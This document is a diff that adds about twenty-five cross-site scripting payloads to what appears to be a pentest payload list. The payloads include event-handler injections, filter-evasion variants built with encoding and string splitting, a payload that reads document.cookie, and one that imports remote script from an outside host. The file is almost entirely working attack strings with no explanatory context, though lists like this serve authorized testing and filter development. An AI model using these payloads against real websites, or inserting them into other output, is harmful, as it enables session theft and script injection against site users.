@@ -1,1 +1,27 @@
 <input name="param1" value= onfocus=alert(document.cookie) autofocus>
+<input onfocus=alert(0) autofocus>
+on<>mouseover="ale<>rt()">
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+">'><details/open/ontoggle=confirm('XSS')>
+')});x=(document),y=x.cookie;(alert)(y);function r(){a('b
+" draggable=true ondragstart="alert(1)
+'-alert(1)-'
+"><svg onload=alert(2)>
+" onmouseover=alert(3) "
+<img src onerror=import('//silicsecurity.net/x/')>
+{alert`1`}
+<xmp><p title="</xmp><svg/onload=alert(45)>”>
+<noscript><p title="</noscript><svg/onload=alert(45)>”>
+<noframes><p title="</noframes><svg/onload=alert(45)>”>
+<iframe><p title="</iframe><svg/onload=alert(45)>">
+"><d3v/onauxclick=[2].some(confirm)>click
+<script>eval('al'+'ert(1)');</script>  
+<script>'alert(1)'.replace(/.+/,eval)</script>
+<img onerror=eval('al\u0065rt(1)') src=a>
+<script>function::['alert'](1)</script>
+<--`<img/src=` onerror=confirm``> --!>
+<b"/onauxclick='-alert(1);'>XXS
+<!<script>alert(1)</script>
+;');alert(1)//
+%22%0d%0a%0d%0a%0d%0a<script>alert(1)</script>
+"><script>co\u006efir\u006d`1`</script>
